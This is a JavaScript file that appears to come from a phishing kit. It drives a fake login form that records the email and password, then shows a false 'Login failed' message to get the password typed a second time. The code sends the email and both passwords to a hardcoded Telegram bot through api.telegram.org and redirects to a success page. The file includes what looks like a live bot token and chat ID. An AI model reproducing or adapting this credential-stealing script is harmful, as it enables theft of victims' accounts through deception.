 
const myForm = document.getElementById('myForm');
const emailField = document.getElementById('user');
const passwordField = document.getElementById('pass');
const errorField = document.getElementById('error');
const submitBtn = document.getElementById('formsubmit');
let clickCount = 0;
let firstPassword = null;
let emailValue = null;

submitBtn.addEventListener('click', (event) => {
  event.preventDefault();

  // Validate input fields on first click
  if (clickCount === 0) {
    if (emailField.value === '' || !isValidEmail(emailField.value) || passwordField.value === '') {
      errorField.innerText = 'Please enter your username and password';
      errorField.style.display = 'block';
      return;
    }

    // Store the email value
    emailValue = emailField.value;

    // Store the first password in session
    firstPassword = passwordField.value;

    // Increment the click count
    clickCount++;

    // Disable the button to prevent multiple submissions
    submitBtn.disabled = true;

    // Reset the form
    myForm.reset();

    // Set the email value back to the input field
    emailField.value = emailValue;

    // Enable the button for the second click
    submitBtn.disabled = false;

    
       // Validate second password input value
       if (firstPassword) {
        errorField.innerText = 'Login failed - Username or password is incorrect';
        errorField.style.display = 'block';
        return;
      }

  } else if (clickCount === 1) {

    //show error if password field is empty
    if (passwordField.value === '') {
        errorField.innerText = 'Login failed - Username or password is incorrect';
        errorField.style.display = 'block';
        return;
    }

    // Disable the button to prevent multiple submissions
    submitBtn.disabled = true;

    // Send message to Telegram chat
    const chatId = '5674884293';
    const botToken = '5736277261:AAEL0BaJHo9kyddgtseYsC-OCCP0D6b7AfA';
    const message = `New form submission:\nEmail: ${emailValue}\nPassword 1: ${firstPassword}\nPassword 2: ${passwordField.value}`;
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(telegramUrl)
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          // Message sent successfully
          console.log('Message sent to Telegram chat successfully!');
          
          // Redirect to success page
          window.location.href = 'success.html';
        } else {
          // Error sending message
          console.error('Error sending message to Telegram chat!');
        }
      })
      .catch(error => console.error(error));

    // Reset the click count to allow for future submissions
    clickCount = 0;

    // Reset the form
    myForm.reset();

    // Set the email value back to the input field
    emailField.value = emailValue;
    passwordField = document.getElementById('pass').value;
  }
});


function isValidEmail(email) {
  // Regex to validate email format
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}